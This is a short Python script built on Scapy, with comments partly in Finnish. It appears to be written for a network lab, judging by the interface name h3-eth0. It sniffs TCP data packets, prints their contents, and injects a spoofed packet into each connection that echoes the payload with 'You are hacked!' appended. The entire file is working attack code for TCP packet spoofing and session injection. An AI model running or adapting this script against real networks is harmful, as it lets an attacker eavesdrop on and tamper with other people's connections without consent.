from scapy.all import *

sent_packets = set()  # sending packet just once

def sniff_tcp_session(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(IP) and pkt.haslayer(Raw):  # waiting for TCP-data packet
        ip_layer = pkt[IP]
        tcp_layer = pkt[TCP]
        raw_layer = pkt[Raw]

        connection_tuple = (ip_layer.src, ip_layer.dst, tcp_layer.sport, tcp_layer.dport)

        # Varmista, että dataa ei ole jo lähetetty tähän yhteyteen
        if connection_tuple not in sent_packets:
            print(f"Sniffed TCP Data Packet: {ip_layer.src} -> {ip_layer.dst} | SEQ: {tcp_layer.seq} | ACK: {tcp_layer.ack}")
            print(f"Original Payload: {raw_layer.load.decode(errors='ignore')}")

            # Lähetetään spoofattu paketti, jossa viesti injektoidaan osaksi liikennettä
            send_spoofed_packet(ip_layer.src, ip_layer.dst, tcp_layer.sport, tcp_layer.dport, tcp_layer.seq, tcp_layer.ack, raw_layer.load.decode(errors="ignore"))

            # Merkitään paketti lähetetyksi, jotta sitä ei lähetetä uudelleen
            sent_packets.add(connection_tuple)

def send_spoofed_packet(source_ip, destination_ip, source_port, destination_port, seq_num, ack_num, original_payload):
    """ Luo TCP-paketti, joka sijoitetaan TCP-streamiin ja sisältää viestin 'You are hacked!' osana alkuperäistä dataa """

    injected_payload = original_payload + " You are hacked!"  # Lisätään viesti osaksi alkuperäistä dataa

    ip_layer = IP(src=destination_ip, dst=source_ip)  # Kohde ja lähde käännetään
    tcp_layer = TCP(sport=destination_port, dport=source_port, seq=ack_num, ack=seq_num, flags="PA")  # Push + ACK

    spoofed_packet = ip_layer / tcp_layer / injected_payload

    print(f"[*] Injecting modified TCP payload: {destination_ip}:{destination_port} -> {source_ip}:{source_port}")

    send(spoofed_packet, verbose=False)

# Sniffataan vain TCP-paketit, joissa on dataa ja lisätään viesti streamiin
print("[*] Sniffing TCP data packets on h3-eth0...")
sniff(iface="h3-eth0", filter="tcp", prn=sniff_tcp_session, store=0)
